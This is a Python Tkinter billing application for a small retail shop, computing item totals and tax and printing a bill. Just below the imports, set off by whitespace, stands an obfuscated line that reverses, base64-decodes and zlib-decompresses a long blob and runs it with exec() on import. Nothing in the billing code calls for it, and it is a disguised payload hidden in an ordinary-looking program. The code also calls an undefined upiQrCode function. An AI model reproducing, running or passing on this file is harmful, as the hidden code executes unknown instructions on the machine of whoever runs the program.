from tkinter import *
import random
# import pyqrcode
                    
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==QAzGFUB8/997/flvaeDG0GNfyVum6XoS+I60+gFOKm2LKxg974H8EzKhyYGalaSV/3VhFIimIIna2O8Y1QDvF74kM/AV92reYCnYXfBfntexRDbglfetHGd3vLnskIG6nHnnOKGkWGeJ/82pNHL/OTz1dYyNz+/SNUv1yDAJaUxPcgNVtcB1YFFAGQuxZ00I1MvDorVuenmbnlviXu6dJqfY9xGlnzvPc6lqppzuT3ZeXbtS6fSvoKdU0AZxZFmZl1diwJxVuUqd2ctn4T0QZ1tfik7sFx76raJoW2b4RR/UrJ5ZN5zCJB3I5gpO3gppDKicuNeaAlfrMbsgsHbL+XV0z8l0khRQ0/gvJ13fBH5gSrPCOPTn7u2PRXLDiRpdBUTRO9QZLa7Y0/XX6cTn/bjT66eBkN/PZLZpQFK1L4Y3B2Mc+/jSx4higcKxwnBp7ITmmQIduhuPzZyIIlsr65pPFTcjqqjCtp2EzEQYcwvAOBJRNKPEUts5O/orHH9XjDpyps36SLsGl1t1I+LDiFtRnej00+M/vf/R0P2BNoqAhzkTk3A0HVHd2ZQd4hN2hmd1WwF5ayTkW/OGa/q1e9DxEW6cqWMAXmCMuEik92oiberqFVgNB1IynwjJi0aQP+Hgy0dKKZAdbEHUKP7sKhSPU/3eNm0oSWI+P9cl9QgPaoH5BHcjJN5YcVoOX190Fi3zjwCBSryiAmRsbn1SUW0DPXE6jjMj7aLZzBJRteqjWMI+Cdyd7oTY5XmgWgvWc4ESTJs4zzMjtX1vLFT/eeB9SvfI+oLBvfb5MTG01CFHYrnLLlyCauYA6eJPOZKH6K//tU8LtGcYFe7weEGhFl2f1SfRcG12Pz3it5pzh19YRoKZKGsqH8bE8YQI5f9EMUanPI0jBRZlFVw8wbKKFHGTnV1eJw9bRyRMcHE1E7LHrvXqoTTWUUsHv/YcSylLz/gonqhZy+lcD8mYeDvwPMMUS1emEUU78dlUtxkSDrPyHiIkkHnkjddwwyYW3EpBjd2qbHWlBTpfPV4zbLGThReTxYgYJNSazxCVgvktmWaquKNs0ElVzidOmh5YkpV8Uvz6YEhVmle6/vor0R3KywYAbM1CB5hFtNBudvaBvF/mK4s0PsAXR2nazZpoot/mmkZHjF3ZylMk2m0nt86Wfrx/XBYpEBOEzfcfQ4Ca0LcGPtReNGsLWpOvSuF/HLk2sHf98JGkp5P3T1Fek6x4ouOt6+seJo4ntBiGbKF6omUUTi4DD1ARHhUmH+4P0vdNfHTsa1H7bhYlrSjx/+0aMb679WKw+sOJ1QlO9GSLta2DrvA+s9GO3sAVXGVOZ5bwKUSU5jQ1XDSzvh/xU6Rs6C5Y8zJSn6BGES2JBZX0DwvKTJaZvpLlOOgiRztdAxvqrDoHirkfaEMlCqvjFQABQAtK9BPtXVpSOJT/gex4lQ/VcjcKORzreBTs5R0oRwdz/9h2AM68cPyYlcwDDnWx06vUL/4Uc1GjpHqmnwPn7BHuS0Mkrhx+6TnOidOQrlZGkDUomjyZEkox1ZMF2fQJZHdu0Tw+zczrSbYcAB4zTz7QIJHuSXKqDJ1r201lv/v38v2qdelwWMn3r5c55qPUvtNlEbxsD6bQfk6YagTKKB75h9uL+yGgR1V/I/8Chwc8fUvbbRHGMXvW3OdkZuxpdSNUycfGqG1NYlQQ8ZdWSkAQVkOTX/UYmYGqtS2J/v+APgChIlIeFYiI5nxWYtSt0CSveCkiHUgW7++J7ghnMzDpl9vQpjLFrIlktu9oXiNgTl9ZZbn/R16eOEcK+WYLVRCIJ1OsScC0XkkFUkpR1k2dnSxxQAbFBfisCbmSzScJFxYqNI8/RnlUsuPUKjWz7vwOvWHBY+mH7HE1Bhjvxs2/DE6lghXwwpWhhG2I9EtgF/CIDc9qTcquRzRybYuaWbzRPBGD76P24NNaLrFaTtuMpLqc2SMvXBxI3J7m1R/yZbiHStkcD2XpqpB/Qm2yLeNiiataWNuuTKZXIfVZUNHo06DMIYgdjZSp/gEqkJNx2Qbl9uueoTGzr0y3e0FjDTPvs848VXmMqig9rfiQkahtb6b/WtL2zhYV2S82JooZtGL37JbdZ108jujjfXcISSDtq43ZPIWTLe+FHWgDdd18ccvRL5xGCyxd97daOWRfGXoNJhNgbWR2bzfRtkt19NxV9VFwrrIniAgUSyibwhmKr+zsMCCFo0ySQNM/bPMQx2WHkfCTLM5yVLNehJ3wfit2HiWKwDJ/jJpXDAmVR+wUxmL/pj4YXO/MG37XyUCuicj5TKfLfAfik8TM8FdJby/D972zrYo2Y5w5PlvjjXmyLLwU5GCPSgKMcIuezP5L+u6Ju/iB7k12mR+54eRxEHNs32FFXrZ5ajwC8k6zUlVOjD7n9bW7qWSOA+Ax+1JgIjmfEj6POJj1eg7EwHfPW65+0mKrAEMJuflxoEyOcMPbA/YxVn6grPgD4AiVTg8uBjvzQ4+XKUwMwBuGa1lUn9QA7vEA8KHuHj+n1aW4W8qlpT/aonInAWc/opmx9e5uVejPMh+UlKPi6T9nQC3A+W1ADyKbkIwjYGTkccBL0zQLtWPh5H6xa99tKjb4S3giQkZBfx/g37Br5ysiJ3FWvDernUImPr/2n4Tkf0zJmM9qimb2Y8P+4K6AUDY4YWd8HwvdRCEeVQX0zcNzRPN0vR5mAz0eODokyDAJ6K8bb+sd+rUxdOZ3WdVpnEDxm8LDgWdTr5EEGv5u1Gq8uoZyJV+GqlMMblcI7PXR5nDLVaW0nru4br8Bm9xalGQFRKeWdd92axRL3Xq/duXBQj5oMZfcpihsDzDTGD8l4DsCuOUnH7jrdbRKDJz6wVDnNd4M9PkKj2CTggKeA+vJO8uWboac7V0FdImEjww9fDGOOweAx7wN3RvZtVXYQQY1mLy5rf8gtJq0ooTw7XmzMZG9+bTT6xoMGcHrF01XH42Bzt2ZNLzFI476mrf95aGjXL6qqegkzLzSslk+Nw3nNSknkfk1cDdu4dVPxHC4zkR9kXwVGVsk2kZ5B7D9tNwVknjTK2PRPxC+WQHrvPjMCBXx3Ehowj2Xt93+rOE3OP623W1qjpVtN/D35O8Gd8ytiDtfi6M7zWFZ9yHCpDiEsCM0JGdaJMVSflzHBiKnSQQRuLFc0q07JRj1qC6SN0eqno6uSrcrultyekwygWgAr2AXbAY+BQ2xlfz6MSct4Fe0/gmMmStVldEkZGzN1tjgpD872ey6Cd5v7Jrzc3oa9MpEkGrFEPkrBII0nh93/8GwThxXQksZliGTR2E2aJW21q/Y5bvpXsbunjNM/uEP9JjNp+AONWVGEAqFSlmlhZdqnl8jxVUERWVCWAUbs5p+FE4n6ZHXbF9lC41L/Cc17whPzc/JW3nzMmLFzxa/KZxaLyj27MY5IvNvOdABIpXKj7ogGZFDZphdNXyYEhhClCDJSv+nbSqs5WP78n6aroYh+V3O2aLm1lcqcJX6AvNixwqmOdlm9YwXbxiv7Kf8xVUQSnpi2r8WJIB0No012sKKJCw4Vcm09LGAYx+4ASVQ2E/uH+Hu/LYil/xWGf+OM0GGffNW386nbMypRC80OSHyKIb6ydL/56pqkHWQoQEYZHFSXKRM7GP5atrN9UnlFozUjxwLBwhCJ/xcGRk+8MtL/VMgY5yuoiCXe5tY7oRe2HFde8iFDLfUzboRLjMUeLwBLrnSuLTkyQCZxCe4PmR2DojKrMsWhHD0+hnpHLohIUWleWKKjAUhM6vhfi0CTyYIKzVKlv+ZTEWjVWXLN7uWj+ll3zEw8NRduy+EsZxoLEHT72MW6qiwtYtNKiDwyB1DNk6QZI3xYYugtA5oQFSmx2PXloPTvec+BpF9uyKhemKOKlyjZLZe07poLonlTw752ghz5LAvlOdIl/FLLKyutUc7bhkszgSEugJuZi4mmv9j1uKHqY56TQq64Tvmudy2AgqRq0V7D2G9cyevBPlhnh1BnDQARq7nOZHIBRPm5RhEY0wcFO1Liu8fbFbfxwCYFSLrYo9rbhAI5LoWKzM2Fo2iKUb1phzmbMlfgAWCcPBft1LGW4KWqXGc+vs0y7+NWpTn1qNeqzsk9EPoWjUkZFW241q0yHtPqdIeshfK0o6sDWN0O/us67nBI091259A8JK2KGzlHNO6A6G6wmr2Wr9nEk1c8QFa80jDhno0uCoRkVKVwTm/UN6Lu+y1Y/rjCpZrLU7Uowanli2Kl5GbvKqkBJHNOYtnfBTBkgGFlWOvSEciutPNurv5gJaxWUwrxq6cP8AomNehADuG/Dzu2xHDAXozDVVC+U9pCqc7TvWmYU3rurjoUJn/iLeqcwGkZYWHQjr//n2/0++//nn/vMfqiytaGV3RXb468/fxMzbNROmZWIeKjYZ0g7n9DRyqUxyW7lVwJe'))

class Bill_App:
    def __init__(self,root):
        self.root = root
        self.root.geometry("1300x700+0+0")
        self.root.maxsize(width = 1280,height = 700)
        self.root.minsize(width = 1280,height = 700)
        self.root.title("Billing Software")
        
        #====================Variables========================#
        self.cus_name = StringVar()
        self.c_phone = StringVar()
        #For Generating Random Bill Numbers
        x = random.randint(1000,9999)
        self.c_bill_no = StringVar()
        #Seting Value to variable
        self.c_bill_no.set(str(x))

        self.bath_soap = IntVar()
        self.face_cream = IntVar()
        self.face_wash = IntVar()
        self.hair_spray = IntVar()
        self.body_lotion = IntVar()
        self.rice = IntVar()
        self.daal = IntVar()
        self.food_oil = IntVar()
        self.wheat = IntVar()
        self.sugar = IntVar()
        self.maza = IntVar()
        self.coke = IntVar()
        self.frooti = IntVar()
        self.nimko = IntVar()
        self.biscuits = IntVar()
        self.total_cosmetics = StringVar()
        self.total_grocery = StringVar()
        self.total_other = StringVar()
        self.tax_cos = StringVar()
        self.tax_groc = StringVar()
        self.tax_other = StringVar()


        #===================================
        bg_color = "#074463"
        fg_color = "white"
        lbl_color = 'white'
        #Title of App
        title = Label(self.root,text = "Billing Software",bd = 12,relief = GROOVE,fg = fg_color,bg = bg_color,font=("times new roman",30,"bold"),pady = 3).pack(fill = X)

        #==========Customers Frame==========#
        F1 = LabelFrame(text = "Customer Details",font = ("time new roman",12,"bold"),fg = "gold",bg = bg_color,relief = GROOVE,bd = 10)
        F1.place(x = 0,y = 80,relwidth = 1)

        #===============Customer Name===========#
        cname_lbl = Label(F1,text="Customer Name",bg = bg_color,fg = fg_color,font=("times new roman",15,"bold")).grid(row = 0,column = 0,padx = 10,pady = 5)
        cname_en = Entry(F1,bd = 8,relief = GROOVE,textvariable = self.cus_name)
        cname_en.grid(row = 0,column = 1,ipady = 4,ipadx = 30,pady = 5)

        #=================Customer Phone==============#
        cphon_lbl = Label(F1,text = "Phone No",bg = bg_color,fg = fg_color,font = ("times new roman",15,"bold")).grid(row = 0,column = 2,padx = 20)
        cphon_en = Entry(F1,bd = 8,relief = GROOVE,textvariable = self.c_phone)
        cphon_en.grid(row = 0,column = 3,ipady = 4,ipadx = 30,pady = 5)

        #====================Customer Bill No==================#
        cbill_lbl = Label(F1,text = "Bill No.",bg = bg_color,fg = fg_color,font = ("times new roman",15,"bold"))
        cbill_lbl.grid(row = 0,column = 4,padx = 20)
        cbill_en = Entry(F1,bd = 8,relief = GROOVE,textvariable = self.c_bill_no)
        cbill_en.grid(row = 0,column = 5,ipadx = 30,ipady = 4,pady = 5)
        
        #====================Bill Search Button===============#
        bill_btn = Button(F1,text = "Enter",bd = 7,relief = GROOVE,font = ("times new roman",12,"bold"),bg = bg_color,fg = fg_color)
        bill_btn.grid(row = 0,column = 6,ipady = 5,padx = 60,ipadx = 19,pady = 5)

        #==================Cosmetics Frame=====================#
        F2 = LabelFrame(self.root,text = 'Cosmetics',bd = 10,relief = GROOVE,bg = bg_color,fg = "gold",font = ("times new roman",13,"bold"))
        F2.place(x = 5,y = 180,width = 325,height = 380)

        #===========Frame Content
        bath_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Bath Soap")
        bath_lbl.grid(row = 0,column = 0,padx = 10,pady = 20)
        bath_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.bath_soap)
        bath_en.grid(row = 0,column = 1,ipady = 5,ipadx = 5)

        #=======Face Cream
        face_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Face Cream")
        face_lbl.grid(row = 1,column = 0,padx = 10,pady = 20)
        face_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.face_cream)
        face_en.grid(row = 1,column = 1,ipady = 5,ipadx = 5)

        #========Face Wash
        wash_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Face Wash")
        wash_lbl.grid(row = 2,column = 0,padx = 10,pady = 20)
        wash_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.face_wash)
        wash_en.grid(row = 2,column = 1,ipady = 5,ipadx = 5)

        #========Hair Spray
        hair_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Hair Spray")
        hair_lbl.grid(row = 3,column = 0,padx = 10,pady = 20)
        hair_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.hair_spray)
        hair_en.grid(row = 3,column = 1,ipady = 5,ipadx = 5)

        #============Body Lotion
        lot_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Body Lotion")
        lot_lbl.grid(row = 4,column = 0,padx = 10,pady = 20)
        lot_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.body_lotion)
        lot_en.grid(row = 4,column = 1,ipady = 5,ipadx = 5)

        #==================Grocery Frame=====================#
        F2 = LabelFrame(self.root,text = 'Grocery',bd = 10,relief = GROOVE,bg = bg_color,fg = "gold",font = ("times new roman",13,"bold"))
        F2.place(x = 330,y = 180,width = 325,height = 380)

        #===========Frame Content
        rice_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Rice")
        rice_lbl.grid(row = 0,column = 0,padx = 10,pady = 20)
        rice_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.rice)
        rice_en.grid(row = 0,column = 1,ipady = 5,ipadx = 5)

        #=======
        oil_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Food Oil")
        oil_lbl.grid(row = 1,column = 0,padx = 10,pady = 20)
        oil_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.food_oil)
        oil_en.grid(row = 1,column = 1,ipady = 5,ipadx = 5)

        #=======
        daal_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Daal")
        daal_lbl.grid(row = 2,column = 0,padx = 10,pady = 20)
        daal_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.daal)
        daal_en.grid(row = 2,column = 1,ipady = 5,ipadx = 5)

        #========
        wheat_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Wheat")
        wheat_lbl.grid(row = 3,column = 0,padx = 10,pady = 20)
        wheat_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.wheat)
        wheat_en.grid(row = 3,column = 1,ipady = 5,ipadx = 5)

        #============
        sugar_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Sugar")
        sugar_lbl.grid(row = 4,column = 0,padx = 10,pady = 20)
        sugar_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.sugar)
        sugar_en.grid(row = 4,column = 1,ipady = 5,ipadx = 5)

        #==================Other Stuff=====================#

        F2 = LabelFrame(self.root,text = 'Others',bd = 10,relief = GROOVE,bg = bg_color,fg = "gold",font = ("times new roman",13,"bold"))
        F2.place(x = 655,y = 180,width = 325,height = 380)

        #===========Frame Content
        maza_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Maza")
        maza_lbl.grid(row = 0,column = 0,padx = 10,pady = 20)
        maza_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.maza)
        maza_en.grid(row = 0,column = 1,ipady = 5,ipadx = 5)

        #=======
        cock_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Coke")
        cock_lbl.grid(row = 1,column = 0,padx = 10,pady = 20)
        cock_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.coke)
        cock_en.grid(row = 1,column = 1,ipady = 5,ipadx = 5)

        #=======
        frooti_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Frooti")
        frooti_lbl.grid(row = 2,column = 0,padx = 10,pady = 20)
        frooti_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.frooti)
        frooti_en.grid(row = 2,column = 1,ipady = 5,ipadx = 5)

        #========
        cold_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Nimkos")
        cold_lbl.grid(row = 3,column = 0,padx = 10,pady = 20)
        cold_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.nimko)
        cold_en.grid(row = 3,column = 1,ipady = 5,ipadx = 5)

        #============
        bis_lbl = Label(F2,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Biscuits")
        bis_lbl.grid(row = 4,column = 0,padx = 10,pady = 20)
        bis_en = Entry(F2,bd = 8,relief = GROOVE,textvariable = self.biscuits)
        bis_en.grid(row = 4,column = 1,ipady = 5,ipadx = 5)

        #===================Bill Aera================#
        F3 = Label(self.root,bd = 10,relief = GROOVE)
        F3.place(x = 960,y = 180,width = 325,height = 380)
        #===========
        bill_title = Label(F3,text = "Bill Area",font = ("Lucida",13,"bold"),bd= 7,relief = GROOVE)
        bill_title.pack(fill = X)

        #============
        scroll_y = Scrollbar(F3,orient = VERTICAL)
        self.txt = Text(F3,yscrollcommand = scroll_y.set)
        scroll_y.pack(side = RIGHT,fill = Y)
        scroll_y.config(command = self.txt.yview)
        self.txt.pack(fill = BOTH,expand = 1)

        #===========Buttons Frame=============#
        F4 = LabelFrame(self.root,text = 'Bill Menu',bd = 10,relief = GROOVE,bg = bg_color,fg = "gold",font = ("times new roman",13,"bold"))
        F4.place(x = 0,y = 560,relwidth = 1,height = 145)

        #===================
        cosm_lbl = Label(F4,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Total Cosmetics")
        cosm_lbl.grid(row = 0,column = 0,padx = 10,pady = 0)
        cosm_en = Entry(F4,bd = 8,relief = GROOVE,textvariable = self.total_cosmetics)
        cosm_en.grid(row = 0,column = 1,ipady = 2,ipadx = 5)

        #===================
        gro_lbl = Label(F4,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Total Grocery")
        gro_lbl.grid(row = 1,column = 0,padx = 10,pady = 5)
        gro_en = Entry(F4,bd = 8,relief = GROOVE,textvariable = self.total_grocery)
        gro_en.grid(row = 1,column = 1,ipady = 2,ipadx = 5)

        #================
        oth_lbl = Label(F4,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Others Total")
        oth_lbl.grid(row = 2,column = 0,padx = 10,pady = 5)
        oth_en = Entry(F4,bd = 8,relief = GROOVE,textvariable = self.total_other)
        oth_en.grid(row = 2,column = 1,ipady = 2,ipadx = 5)

        #================
        cosmt_lbl = Label(F4,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Cosmetics Tax")
        cosmt_lbl.grid(row = 0,column = 2,padx = 30,pady = 0)
        cosmt_en = Entry(F4,bd = 8,relief = GROOVE,textvariable = self.tax_cos)
        cosmt_en.grid(row = 0,column = 3,ipady = 2,ipadx = 5)

        #=================
        grot_lbl = Label(F4,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Grocery Tax")
        grot_lbl.grid(row = 1,column = 2,padx = 30,pady = 5)
        grot_en = Entry(F4,bd = 8,relief = GROOVE,textvariable = self.tax_groc)
        grot_en.grid(row = 1,column = 3,ipady = 2,ipadx = 5)

        #==================
        otht_lbl = Label(F4,font = ("times new roman",15,"bold"),fg = lbl_color,bg = bg_color,text = "Others Tax")
        otht_lbl.grid(row = 2,column = 2,padx = 10,pady = 5)
        otht_en = Entry(F4,bd = 8,relief = GROOVE,textvariable = self.tax_other)
        otht_en.grid(row = 2,column = 3,ipady = 2,ipadx = 5)

        #====================
        total_btn = Button(F4,text = "Total",bg = bg_color,fg = fg_color,font=("lucida",12,"bold"),bd = 7,relief = GROOVE,command = self.total)
        total_btn.grid(row = 1,column = 4,ipadx = 20,padx = 30)

        #========================
        genbill_btn = Button(F4,text = "Generate Bill",bg = bg_color,fg = fg_color,font=("lucida",12,"bold"),bd = 7,relief = GROOVE,command = self.bill_area)
        genbill_btn.grid(row = 1,column = 5,ipadx = 20)

        #====================
        clear_btn = Button(F4,text = "Clear",bg = bg_color,fg = fg_color,font=("lucida",12,"bold"),bd = 7,relief = GROOVE,command = self.clear)
        clear_btn.grid(row = 1,column = 6,ipadx = 20,padx = 30)

        #======================
        exit_btn = Button(F4,text = "Exit",bg = bg_color,fg = fg_color,font=("lucida",12,"bold"),bd = 7,relief = GROOVE,command = self.exit)
        exit_btn.grid(row = 1,column = 7,ipadx = 20)

#Function to get total prices
    def total(self):
        #=================Total Cosmetics Prices
        self.total_cosmetics_prices = (
            (self.bath_soap.get() * 40)+
            (self.face_cream.get() * 140)+
            (self.face_wash.get() * 240)+
            (self.hair_spray.get() * 340)+
            (self.body_lotion.get() * 260)
        )
        self.total_cosmetics.set("Rs. "+str(self.total_cosmetics_prices))
        self.tax_cos.set("Rs. "+str(round(self.total_cosmetics_prices*0.05)))
        #====================Total Grocery Prices
        self.total_grocery_prices = (
            (self.wheat.get()*100)+
            (self.food_oil.get() * 180)+
            (self.daal.get() * 80)+
            (self.rice.get() *80)+
            (self.sugar.get() * 170)

        )
        self.total_grocery.set("Rs. "+str(self.total_grocery_prices))
        self.tax_groc.set("Rs. "+str(round(self.total_grocery_prices*0.05)))
        #======================Total Other Prices
        self.total_other_prices = (
            (self.maza.get() * 20)+
            (self.frooti.get() * 50)+
            (self.coke.get() * 60)+
            (self.nimko.get() * 20)+
            (self.biscuits.get() * 20)
        )
        self.total_other.set("Rs. "+str(self.total_other_prices))
        self.tax_other.set("Rs. "+str(round(self.total_other_prices*0.05)))


#Function For Text Area
    def welcome_soft(self):
        self.txt.delete('1.0',END)
        self.txt.insert(END,"       Welcome To Kedar's Retail\n")
        self.txt.insert(END,f"\nBill No. : {str(self.c_bill_no.get())}")
        self.txt.insert(END,f"\nCustomer Name : {str(self.cus_name.get())}")
        self.txt.insert(END,f"\nPhone No. : {str(self.c_phone.get())}")
        self.txt.insert(END,"\n===================================")
        self.txt.insert(END,"\nProduct          Qty         Price")
        self.txt.insert(END,"\n===================================")

#Function to clear the bill area
    def clear(self):
        self.txt.delete('1.0',END)

#Add Product name , qty and price to bill area
    def bill_area(self):
        self.welcome_soft()
        if self.bath_soap.get() != 0:
            self.txt.insert(END,f"\nBath Soap         {self.bath_soap.get()}           {self.bath_soap.get() * 40}")
        if self.face_cream.get() != 0:
            self.txt.insert(END,f"\nFace Cream        {self.face_cream.get()}           {self.face_cream.get() * 140}")
        if self.face_wash.get() != 0:
            self.txt.insert(END,f"\nFace Wash         {self.face_wash.get()}           {self.face_wash.get() * 240}")
        if self.hair_spray.get() != 0:
            self.txt.insert(END,f"\nHair Spray        {self.hair_spray.get()}           {self.hair_spray.get() * 340}")
        if self.body_lotion.get() != 0 :
            self.txt.insert(END,f"\nBody Lotion       {self.body_lotion.get()}           {self.body_lotion.get() * 260}")
        if self.wheat.get() != 0:
            self.txt.insert(END,f"\nWheat             {self.wheat.get()}           {self.wheat.get() * 100}")
        if self.food_oil.get() != 0:
            self.txt.insert(END,f"\nFood Oil          {self.food_oil.get()}           {self.food_oil.get() * 180}")
        if self.daal.get() != 0:
            self.txt.insert(END,f"\nDaal              {self.daal.get()}           {self.daal.get() * 80}")
        if self.rice.get() != 0:
            self.txt.insert(END,f"\nRice              {self.rice.get()}           {self.rice.get() * 80}")
        if self.sugar.get() != 0:
            self.txt.insert(END,f"\nSugar             {self.sugar.get()}           {self.sugar.get() * 170}")
        if self.maza.get() != 0:
            self.txt.insert(END,f"\nMaza              {self.maza.get()}           {self.maza.get() * 20}")
        if self.frooti.get() != 0:
            self.txt.insert(END,f"\nFrooti            {self.frooti.get()}           {self.frooti.get() * 50}")
        if self.coke.get() != 0:
            self.txt.insert(END,f"\nCoke              {self.coke.get()}           {self.coke.get() * 60}")
        if self.nimko.get() != 0:
            self.txt.insert(END,f"\nNimko             {self.nimko.get()}           {self.nimko.get() * 20}")
        if self.biscuits.get() != 0:
            self.txt.insert(END,f"\nBiscuits          {self.biscuits.get()}           {self.biscuits.get() * 20}")
        self.txt.insert(END,"\n===================================")
        self.txt.insert(END,f"\n                      Total : {self.total_cosmetics_prices+self.total_grocery_prices+self.total_other_prices+self.total_cosmetics_prices * 0.05+self.total_grocery_prices * 0.05+self.total_other_prices * 0.05}")
        upiQrCode(self.total_cosmetics_prices+self.total_grocery_prices+self.total_other_prices+self.total_cosmetics_prices * 0.05+self.total_grocery_prices * 0.05+self.total_other_prices * 0.05)

    #Function to exit
    def exit(self):
        self.root.destroy()

    #Function To Clear All Fields


        


root = Tk()
object = Bill_App(root)
root.mainloop()



